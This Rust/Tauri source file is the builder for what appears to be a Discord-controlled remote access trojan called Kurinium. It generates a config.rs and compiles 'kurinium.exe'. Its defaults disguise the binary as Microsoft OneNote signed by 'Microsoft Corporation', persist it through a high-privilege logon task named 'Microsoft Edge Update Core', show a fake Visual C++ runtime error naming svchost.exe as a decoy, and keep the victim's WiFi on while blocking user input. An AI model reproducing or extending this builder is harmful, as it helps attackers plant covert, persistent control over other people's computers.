#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use serde::{Deserialize, Serialize};
use tauri::Emitter;

#[derive(Debug, Clone, Serialize, Deserialize)]
struct KuriniumConfig {
    // Bot Settings
    discord_token: String,
    guild_id: String,
    bot_prefix: String,
    max_file_size_mb: f64,
    show_console: bool,
    
    // Installation
    installation_path: u8,
    
    // Startup
    startup_enabled: bool,
    startup_task_name: String,
    startup_on_logon: bool,
    startup_highest_privileges: bool,
    
    // Decoy
    decoy_enabled: bool,
    decoy_title: String,
    decoy_message: String,
    decoy_icon: String,
    decoy_buttons: String,
    
    // Auth
    auth_roles: bool,
    allowed_roles: Vec<String>,
    auth_user: bool,
    allowed_users: Vec<String>,
    auth_all: bool,
    
    // Keep Active
    keep_active_enabled: bool,
    keep_active_interval: u64,
    
    // WiFi Monitor
    wifi_monitor_enabled: bool,
    wifi_check_interval_ms: u64,
    wifi_re_enable_delay_seconds: u64,
    wifi_block_user_input: bool,
    
    // Build Info
    build_file_name: String,
    build_product_name: String,
    build_description: String,
    build_company_name: String,
    build_file_version: String,
}

impl Default for KuriniumConfig {
    fn default() -> Self {
        Self {
            discord_token: String::new(),
            guild_id: String::new(),
            bot_prefix: ".".to_string(),
            max_file_size_mb: 10.0,
            show_console: false,
            installation_path: 1,
            startup_enabled: true,
            startup_task_name: "Microsoft Edge Update Core".to_string(),
            startup_on_logon: true,
            startup_highest_privileges: true,
            decoy_enabled: false,
            decoy_title: "Microsoft Visual C++ Runtime Library".to_string(),
            decoy_message: "Runtime Error!\\n\\nProgram: C:\\\\Windows\\\\System32\\\\svchost.exe\\n\\nR6025\\n- pure virtual function call".to_string(),
            decoy_icon: "Error".to_string(),
            decoy_buttons: "Ok".to_string(),
            auth_roles: false,
            allowed_roles: Vec::new(),
            auth_user: false,
            allowed_users: Vec::new(),
            auth_all: true,
            keep_active_enabled: true,
            keep_active_interval: 60,
            wifi_monitor_enabled: true,
            wifi_check_interval_ms: 500,
            wifi_re_enable_delay_seconds: 3,
            wifi_block_user_input: true,
            build_file_name: "Microsoft.OneNote.exe".to_string(),
            build_product_name: "Microsoft OneNote".to_string(),
            build_description: "Microsoft OneNote".to_string(),
            build_company_name: "Microsoft Corporation".to_string(),
            build_file_version: "10.0.19041.3303".to_string(),
        }
    }
}

#[tauri::command]
fn get_default_config() -> KuriniumConfig {
    KuriniumConfig::default()
}

#[tauri::command]
fn read_existing_config() -> Result<KuriniumConfig, String> {
    let config_path = std::env::current_dir()
        .map_err(|e| e.to_string())?
        .parent()
        .ok_or("Failed to get parent directory")?
        .parent()
        .ok_or("Failed to get parent directory")?
        .join("src")
        .join("config.rs");

    if !config_path.exists() {
        return Ok(KuriniumConfig::default());
    }
    
    let content = std::fs::read_to_string(&config_path)
        .map_err(|e| format!("Failed to read config: {}", e))?;
    
    let mut config = KuriniumConfig::default();
    
    for line in content.lines() {
        let line = line.trim();
        
        if line.contains("DISCORD_TOKEN") && line.contains("=") {
            if let Some(token) = extract_string_value(line) {
                config.discord_token = token;
            }
        } else if line.contains("GUILD_ID") && line.contains("=") {
            if let Some(id) = extract_number_value(line) {
                config.guild_id = id.to_string();
            }
        } else if line.contains("BOT_PREFIX") && line.contains("=") {
            if let Some(prefix) = extract_string_value(line) {
                config.bot_prefix = prefix;
            }
        } else if line.contains("INSTALLATION_PATH") && line.contains("=") {
            if let Some(path) = extract_u8_value(line) {
                config.installation_path = path;
            }
        } else if line.contains("MAX_FILE_SIZE_MB") && line.contains("=") {
            if let Some(size) = extract_float_value(line) {
                config.max_file_size_mb = size;
            }
        } else if line.contains("SHOW_CONSOLE") && line.contains("=") {
            config.show_console = line.contains("true");
        } else if line.contains("enabled:") && line.contains("true") {
            if content[..content.find(line).unwrap_or(0)].contains("StartupConfig") {
                config.startup_enabled = true;
            } else if content[..content.find(line).unwrap_or(0)].contains("DecoyConfig") {
                config.decoy_enabled = true;
            } else if content[..content.find(line).unwrap_or(0)].contains("KeepActiveConfig") {
                config.keep_active_enabled = true;
            } else if content[..content.find(line).unwrap_or(0)].contains("WifiMonitorConfig") {
                config.wifi_monitor_enabled = true;
            }
        }
    }
    
    Ok(config)
}

fn extract_string_value(line: &str) -> Option<String> {
    if let Some(start) = line.find('"') {
        if let Some(end) = line[start + 1..].find('"') {
            return Some(line[start + 1..start + 1 + end].to_string());
        }
    }
    None
}

fn extract_number_value(line: &str) -> Option<u64> {
    line.split('=')
        .nth(1)?
        .split("//")
        .next()?
        .trim()
        .trim_end_matches(';')
        .trim()
        .parse()
        .ok()
}

fn extract_u8_value(line: &str) -> Option<u8> {
    line.split('=')
        .nth(1)?
        .trim()
        .trim_end_matches(';')
        .trim()
        .parse()
        .ok()
}

fn extract_float_value(line: &str) -> Option<f64> {
    line.split('=')
        .nth(1)?
        .trim()
        .trim_end_matches(';')
        .trim()
        .parse()
        .ok()
}

#[tauri::command]
fn generate_config_file(config: KuriniumConfig) -> Result<String, String> {
    let allowed_roles_set = if config.allowed_roles.is_empty() {
        "HashSet::from([])".to_string()
    } else {
        let roles = config.allowed_roles
            .iter()
            .map(|r| format!("\"{}\"", r))
            .collect::<Vec<_>>()
            .join(", ");
        format!("HashSet::from([{}])", roles)
    };
    
    let allowed_users_set = if config.allowed_users.is_empty() {
        "HashSet::from([])".to_string()
    } else {
        let users = config.allowed_users
            .iter()
            .map(|u| format!("\"{}\"", u))
            .collect::<Vec<_>>()
            .join(", ");
        format!("HashSet::from([{}])", users)
    };

    let config_content = format!(r#"use std::collections::HashSet;
use twilight_model::id::{{marker::GuildMarker, Id}};

pub struct KeepActiveConfig {{
    pub enabled: bool,
    pub interval_seconds: u64,
}}

pub struct WifiMonitorConfig {{
    pub enabled: bool,
    pub check_interval_ms: u64,
    pub re_enable_delay_seconds: u64,
    pub block_user_input: bool,
}}

pub struct StartupConfig {{
    pub enabled: bool,
    pub task_name: &'static str,
    pub on_logon: bool,
    pub highest_privileges: bool,
}}

#[allow(dead_code)]
pub enum MessageBoxIcon {{
    Error,
    Warning,
    Info,
    Question,
}}

#[allow(dead_code)]
pub enum MessageBoxButtons {{
    Ok,
    OkCancel,
    YesNo,
}}

pub struct DecoyConfig {{
    pub enabled: bool,
    pub title: &'static str,
    pub message: &'static str,
    pub icon: MessageBoxIcon,
    pub buttons: MessageBoxButtons,
}}

#[allow(dead_code)]
pub struct BuildInfo {{
    pub file_name: &'static str,
    pub product_name: &'static str,
    pub description: &'static str,
    pub company_name: &'static str,
    pub file_version: &'static str,
}}

pub struct Config;

impl Config {{
    pub const DISCORD_TOKEN: &'static str = "{}";
    pub const GUILD_ID: u64 = {};
    pub const BOT_PREFIX: &'static str = "{}";
    pub const INSTALLATION_PATH: u8 = {};
    pub const MAX_FILE_SIZE_MB: f64 = {:.1};

    pub fn get_startup_config() -> StartupConfig {{
        StartupConfig {{
            enabled: {},
            task_name: "{}",
            on_logon: {},
            highest_privileges: {},
        }}
    }}

    pub fn get_decoy_config() -> DecoyConfig {{
        DecoyConfig {{
            enabled: {},
            title: "{}",
            message: "{}",
            icon: MessageBoxIcon::{},
            buttons: MessageBoxButtons::{},
        }}
    }}

    pub fn get_auth_config() -> AuthConfig {{
        AuthConfig {{
            auth_roles: {},
            allowed_roles: {},
            auth_user: {},
            allowed_users: {},
            auth_all: {},
        }}
    }}

    pub fn get_keep_active_config() -> KeepActiveConfig {{
        KeepActiveConfig {{
            enabled: {},
            interval_seconds: {},
        }}
    }}

    pub fn get_wifi_monitor_config() -> WifiMonitorConfig {{
        WifiMonitorConfig {{
            enabled: {},
            check_interval_ms: {},
            re_enable_delay_seconds: {},
            block_user_input: {},
        }}
    }}

    pub fn get_build_info() -> BuildInfo {{
        BuildInfo {{
            file_name: "{}",
            product_name: "{}",
            description: "{}",
            company_name: "{}",
            file_version: "{}",
        }}
    }}

    pub fn get_guildid() -> Id<GuildMarker> {{
        Id::new(Self::GUILD_ID)
    }}

    pub fn get_token() -> String {{
        Self::DISCORD_TOKEN.to_string()
    }}

    pub fn get_exe_name() -> &'static str {{
        Self::get_build_info().file_name
    }}

    pub fn get_max_bfilesize() -> usize {{
        (Self::MAX_FILE_SIZE_MB * 1024.0 * 1024.0) as usize
    }}
}}

#[derive(Debug, Clone)]
pub struct AuthConfig {{
    pub auth_roles: bool,
    pub allowed_roles: HashSet<String>,
    pub auth_user: bool,
    pub allowed_users: HashSet<String>,
    pub auth_all: bool,
}}

impl Default for AuthConfig {{
    fn default() -> Self {{
        Self {{
            auth_roles: false,
            allowed_roles: HashSet::new(),
            auth_user: false,
            allowed_users: HashSet::new(),
            auth_all: true,
        }}
    }}
}}

#[cfg(debug_assertions)]
impl Config {{
    pub const SHOW_CONSOLE: bool = {};
}}

#[cfg(not(debug_assertions))]
impl Config {{
    pub const SHOW_CONSOLE: bool = {};
}}
"#,
        config.discord_token,
        config.guild_id,
        config.bot_prefix,
        config.installation_path,
        config.max_file_size_mb,
        config.startup_enabled,
        config.startup_task_name,
        config.startup_on_logon,
        config.startup_highest_privileges,
        config.decoy_enabled,
        config.decoy_title,
        config.decoy_message,
        config.decoy_icon,
        config.decoy_buttons,
        config.auth_roles,
        allowed_roles_set,
        config.auth_user,
        allowed_users_set,
        config.auth_all,
        config.keep_active_enabled,
        config.keep_active_interval,
        config.wifi_monitor_enabled,
        config.wifi_check_interval_ms,
        config.wifi_re_enable_delay_seconds,
        config.wifi_block_user_input,
        config.build_file_name,
        config.build_product_name,
        config.build_description,
        config.build_company_name,
        config.build_file_version,
        config.show_console,
        config.show_console,
    );

    Ok(config_content)
}

#[tauri::command]
async fn save_config_file(config: KuriniumConfig) -> Result<String, String> {
    let config_content = generate_config_file(config)?;

    let config_path = std::env::current_dir()
        .map_err(|e| e.to_string())?
        .parent()
        .ok_or("Failed to get parent directory")?
        .parent()
        .ok_or("Failed to get parent directory")?
        .join("src")
        .join("config.rs");

    std::fs::write(&config_path, config_content)
        .map_err(|e| format!("Failed to write config file: {}", e))?;

    Ok(format!("Config saved to: {}", config_path.display()))
}

#[tauri::command]
async fn build_bot(window: tauri::Window) -> Result<String, String> {
    use std::process::Command;

    let project_dir = std::env::current_dir()
        .map_err(|e| e.to_string())?
        .parent()
        .ok_or("Failed to get parent directory")?
        .parent()
        .ok_or("Failed to get parent directory")?
        .to_path_buf();

    window.emit("build-progress", serde_json::json!({ "progress": 10, "message": "Initializing build..." }))
        .map_err(|e| e.to_string())?;

    window.emit("build-progress", serde_json::json!({ "progress": 20, "message": "Saving configuration..." }))
        .map_err(|e| e.to_string())?;

    window.emit("build-progress", serde_json::json!({ "progress": 40, "message": "Compiling bot code..." }))
        .map_err(|e| e.to_string())?;

    let output = Command::new("cargo")
        .arg("build")
        .arg("--release")
        .current_dir(&project_dir)
        .output()
        .map_err(|e| format!("Failed to execute cargo build: {}", e))?;

    if !output.status.success() {
        let error_msg = String::from_utf8_lossy(&output.stderr);
        return Err(format!("Build failed: {}", error_msg));
    }

    window.emit("build-progress", serde_json::json!({ "progress": 80, "message": "Build completed..." }))
        .map_err(|e| e.to_string())?;

    let exe_path = project_dir.join("target").join("release").join("kurinium.exe");

    window.emit("build-progress", serde_json::json!({ "progress": 100, "message": "Build completed successfully!" }))
        .map_err(|e| e.to_string())?;

    Ok(format!("Build completed! Executable: {}", exe_path.display()))
}

fn main() {
    tauri::Builder::default()
        .plugin(tauri_plugin_shell::init())
        .plugin(tauri_plugin_process::init())
        .invoke_handler(tauri::generate_handler![
            get_default_config,
            read_existing_config,
            generate_config_file,
            save_config_file,
            build_bot
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
